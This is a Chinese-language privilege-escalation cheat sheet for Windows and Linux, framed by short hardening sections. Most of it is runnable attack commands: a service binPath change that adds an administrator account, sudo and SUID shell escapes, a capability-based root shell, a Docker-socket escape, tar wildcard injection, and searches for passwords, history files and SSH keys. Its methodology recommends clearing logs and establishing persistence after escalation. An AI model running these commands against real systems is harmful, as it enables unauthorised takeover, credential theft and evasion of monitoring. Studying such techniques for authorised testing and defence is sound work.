# 防御与加固建议

**Windows加固**

```
1. 及时安装系统补丁
   - 配置WSUS或Windows Update自动更新
   - 定期检查缺失补丁

2. 服务安全配置
   - 为服务二进制路径添加引号
   - 限制服务文件和目录权限
   - 使用最小权限服务账户

3. 权限管理
   - 遵循最小权限原则
   - 定期审计用户权限和组成员
   - 限制SeImpersonate、SeAssignPrimaryToken等危险特权

4. 安全配置
   - 禁用AlwaysInstallElevated
   - 限制注册表和文件系统ACL
   - 启用UAC并设置最高通知级别

5. 监控与检测
   - 监控异常进程创建
   - 监控服务配置变更
   - 监控特权使用
```

**Linux加固**

```bash
# 1. 及时更新内核
apt update && apt upgrade -y
# 或
yum update -y

# 2. SUID审计
# 定期审计SUID程序
find / -perm -4000 -type f 2>/dev/null
# 移除不必要的SUID位
chmod u-s /usr/bin/不必要的程序

# 3. sudo配置加固
# 编辑/etc/sudoers
visudo
# 使用具体命令而非ALL
user ALL=(root) /usr/bin/systemctl restart nginx
# 启用sudo日志

# 4. Cron安全
# 确保cron脚本权限正确
chmod 600 /etc/crontab
chmod 700 /etc/cron.d/
# 在cron脚本中使用绝对路径

# 5. capabilities审计
getcap -r / 2>/dev/null
# 移除不必要的capabilities
setcap -r /usr/bin/不必要的程序

# 6. NFS安全
# 禁用no_root_squash
# 编辑/etc/exports使用root_squash

# 7. 文件权限
# 确保敏感文件权限正确
chmod 600 /etc/shadow
chmod 644 /etc/passwd
chmod 700 ~/.ssh/
chmod 600 ~/.ssh/authorized_keys

# 8. 内核参数加固
# /etc/sysctl.d/99-security.conf
kernel.exec-shield = 1
kernel.randomize_va_space = 2
fs.suid_dumpable = 0
```

#### 常见 Windows 提权路径

```powershell
# ===== 1. 服务路径提权（Unquoted Service Paths）=====
# 查找未加引号且路径含空格的服务
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
# 或
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -match ' ' -and $_.StartMode -eq 'Auto' } | Select-Object Name,PathName

# 如果服务路径是: C:\Program Files\My Service\service.exe
# 且C:\Program.exe不存在，则可以上传恶意Program.exe实现提权

# ===== 2. 服务权限配置错误 =====
# 查找当前用户可修改的服务
# 使用 accesschk (Sysinternals工具)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
# 查找可修改的服务二进制文件
accesschk.exe -uwqs Users c:\*.*

# 如果能修改服务配置，可以更改服务二进制路径
sc config servicename binPath= "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
sc stop servicename
sc start servicename

# ===== 3. AlwaysInstallElevated =====
# 检查是否启用（两个注册表键都为1时可利用）
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 如果都为1，构造恶意MSI包以SYSTEM权限执行
# 工具: msfvenom -f msi / Advanced Installer

# ===== 4. 注册表Run键提权 =====
# 检查是否有可写的启动项注册表键
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
# 如果普通用户能修改HKLM的Run键，则等待管理员登录时触发

# ===== 5. 计划任务提权 =====
# 查找以高权限运行且任务文件可写的计划任务
schtasks /query /fo LIST /v
# 重点关注: 以SYSTEM/管理员运行的任务 + 任务脚本可被当前用户修改

# ===== 6. 令牌窃取（Token Impersonation）=====
# 查看当前令牌特权
whoami /priv
# 关注: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
# 如果启用了这些特权，可以使用:
# - Juicy Potato
# - Rogue Potato
# - PrintSpoofer
# - GodPotato

# ===== 7. DLL劫持 =====
# 查找缺少的DLL（进程启动时加载失败的DLL）
# 使用 Process Monitor 监控
# 过滤: Result = NAME NOT FOUND + Path = .dll

# ===== 8. 注册表权限配置错误 =====
# 检查可写的注册表项
# 使用 accesschk 或 PowerShell ACL审计

# ===== 9. 组策略首选项（GPP）密码 =====
# 在域环境中，SYSVOL共享中可能有Groups.xml含密码
# 路径: \\domain\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
# 密码可以用已知密钥解密

# ===== 10. 可写的服务可执行文件 =====
# 查找服务路径中当前用户可写的文件
# 配合accesschk使用
```

#### 常见 Linux 提权路径

```bash
# ===== 1. SUDO 提权 =====
# 查看sudo权限
sudo -l

# 常见可利用的sudo命令:
# - vim: sudo vim -c ':!/bin/sh'
# - find: sudo find / -exec /bin/sh \;
# - nmap: sudo nmap --interactive > !sh
# - less/more: sudo less /etc/profile > !sh
# - python: sudo python -c 'import os; os.system("/bin/sh")'
# - perl: sudo perl -e 'exec "/bin/bash";'
# - ruby: sudo ruby -e 'exec "/bin/bash"'
# - lua: sudo lua -e 'os.execute("/bin/bash")'
# - awk: sudo awk 'BEGIN {system("/bin/bash")}'
# - tcpdump: sudo tcpdump -n -r /dev/null -w /tmp/test -z /bin/bash
# - docker: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# - git: sudo git -p help config > !sh

# 完整列表参考: https://gtfobins.github.io/

# ===== 2. SUID 提权 =====
# 查找SUID文件
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# 常见可利用的SUID程序:
# - nmap: 旧版可交互
# - vim: vim -c ':!/bin/sh'
# - find: find / -exec /bin/sh \;
# - bash: bash -p （以root权限启动保留euid）
# - cp: 复制/etc/shadow后破解或添加用户
# - mv: 移动/etc/shadow
# - chmod/chown: 修改敏感文件权限
# - python/perl/ruby: 执行系统命令
# - gdb: gdb -nx -ex '!sh' -ex quit
# - rbash逃逸: 多种方法

# 完整列表参考: https://gtfobins.github.io/

# ===== 3. Capabilities 提权 =====
# 查找有capabilities的文件
getcap -r / 2>/dev/null

# 常见可利用的capabilities:
# - cap_setuid: 可以设置UID
#   例: setcap cap_setuid+ep /usr/bin/python2.7
#   利用: python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
#
# - cap_dac_read_search: 可以读任何文件
#   例: 读取 /etc/shadow
#
# - cap_sys_admin: 多种利用方式（挂载等）

# ===== 4. 内核漏洞提权 =====
# 检查内核版本
uname -r
cat /proc/version

# 常见内核提权漏洞:
# - Dirty Cow (CVE-2016-5195): 影响Linux 2.6.22 - 4.8.3
# - Dirty Pipe (CVE-2022-0847): 影响Linux 5.8 - 5.16.11/5.15.25/5.10.102
# - SUDO 漏洞 (CVE-2021-3156 Baron Samedit): sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
# - Polkit (CVE-2021-4034 PwnKit): polkit版本 < 0.120
# - Netfilter (CVE-2023-32233): 内核 6.1-rc1 ~ 6.3.1

# 工具推荐:
# - Linux Exploit Suggester: linux-exploit-suggester.sh
# - linux-smart-enumeration: lse.sh
# - LinPEAS: linpeas.sh (最全面)

# ===== 5. 定时任务（Cron）提权 =====
# 查找系统cron任务
ls -la /etc/cron.d/
cat /etc/crontab
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/

# 查找用户crontab
ls -la /var/spool/cron/crontabs/  # Debian
ls -la /var/spool/cron/           # RHEL

# 提权方法:
# - 如果cron任务以root运行，且脚本可被当前用户写 -> 直接修改脚本
# - 如果脚本路径中目录可写 -> PATH注入/通配符注入
# - 如果脚本调用相对路径的命令 -> PATH劫持

# ===== 6. NFS 共享提权 =====
# 查看NFS共享
showmount -e localhost
cat /etc/exports

# 如果共享配置了 no_root_squash
# 攻击者可以在客户端以root身份创建SUID文件，在服务器上执行
# 挂载: mount -o rw,vers=2 target:/share /tmp/mountpoint

# ===== 7. 通配符注入 =====
# 如果cron脚本中有类似:
#   tar czf backup.tar.gz *
# 可以在目录中创建特殊文件名注入参数:
#   touch "--checkpoint=1"
#   touch "--checkpoint-action=exec=sh shell.sh"

# ===== 8. PATH 劫持 =====
# 如果SUID程序或cron脚本调用相对路径的命令
# 可以修改PATH环境变量，插入恶意同名程序

# ===== 9. Docker/LXC 容器逃逸 =====
# 检查是否在容器中
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# 如果挂载了Docker socket
ls -la /var/run/docker.sock
# 可以创建特权容器逃逸
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ===== 10. 密码复用与配置文件 =====
# 查找包含密码的配置文件
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /var/www/ 2>/dev/null
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# 查找历史命令中的密码
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# 查找SSH密钥
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys

# ===== 11. Nginx/Apache 配置文件 =====
cat /etc/nginx/nginx.conf
cat /etc/apache2/apache2.conf
# 可能包含htpasswd文件路径、数据库密码等

# ===== 12. 数据库密码 =====
# MySQL配置文件
cat /etc/mysql/my.cnf
cat ~/.my.cnf
# PostgreSQL
cat /var/lib/pgsql/*/data/pg_hba.conf
```

### 四、提权检查路径速查表

| 类型 | Windows 检查命令 | Linux 检查命令 |
|------|-----------------|----------------|
| 当前权限 | `whoami /priv` / `whoami /all` | `id` / `sudo -l` |
| 内核/系统版本 | `systeminfo` | `uname -a` / `cat /etc/os-release` |
| 已安装补丁 | `wmic qfe list brief` | 视发行版而定 (apt/yum history) |
| SUID/权限文件 | `accesschk` / 服务路径 | `find / -perm -4000 -type f` |
| Capabilities | - | `getcap -r /` |
| 服务/进程权限 | `sc qc` / `tasklist /v` | `ps aux` / `systemctl list-units` |
| 计划任务 | `schtasks /query /fo LIST /v` | `crontab -l` / `ls /etc/cron*` |
| 启动项/注册表 | `reg query HKLM\...\Run` | `/etc/rc.local` / systemd service |
| 网络监听 | `netstat -ano` | `ss -tulnp` / `netstat -tulnp` |
| 密码/密钥 | 配置文件 / 注册表 | `find / -name "*.key" -o -name "*.pem"` |

> **提权方法论**：
> 1. **信息收集**：尽可能收集系统信息，不要放过任何细节
> 2. **枚举验证**：用自动化工具快速扫描，但不要盲目相信结果
> 3. **分类尝试**：从最简单的（sudo/suid）开始，再到内核漏洞
> 4. **日志清理**：成功提权后注意清除操作痕迹
> 5. **持久化**：获取高权限后建立持久访问方式
>
> **防御提示**：
> - 定期更新系统补丁，特别是内核安全补丁
> - 遵循最小权限原则，审计sudo和SUID配置
> - 启用文件完整性监控（AIDE/OSSEC）
> - 配置集中日志收集，监控异常提权行为
> - 定期使用审计工具自查，发现并修复弱点
